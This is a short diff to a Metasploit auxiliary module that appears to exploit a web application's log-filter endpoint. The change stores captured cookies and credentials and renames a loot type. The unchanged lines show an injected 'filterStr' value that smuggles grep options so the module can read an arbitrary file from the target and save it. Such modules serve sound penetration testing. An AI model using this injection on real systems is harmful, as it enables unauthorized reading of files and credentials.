@@ -88,13 +88,15 @@ class MetasploitModule < Msf::Auxiliary
       return
     elsif res.code == 200
       vprint_good('Authenticated Successfully')
+      cookie = res.get_cookies
+      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'], proof: cookie)
     end
 
     # pull the file
     res = send_request_cgi({
       'uri'    => normalize_uri(datastore['TARGETURI'], 'modules/common/logs'),
       'method' => 'GET',
-      'cookie' => res.get_cookies,
+      'cookie' => cookie,
       'vars_get' => {
         'filterStr' => "msg:-e .* #{datastore['FILE']}"
       }
@@ -122,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
       if reconstructed_file.any?
         reconstructed_file = reconstructed_file.join("\n")
         vprint_good("File Contents:\n#{reconstructed_file}")
-        stored_path = store_loot('host.file', 'text/plain', rhost, reconstructed_file, datastore['FILE'])
+        stored_path = store_loot('host.files', 'text/plain', rhost, reconstructed_file, datastore['FILE'])
         print_good("Stored #{datastore['FILE']} to #{stored_path}")
       else
         print_error("File not found or empty file: #{datastore['FILE']}")
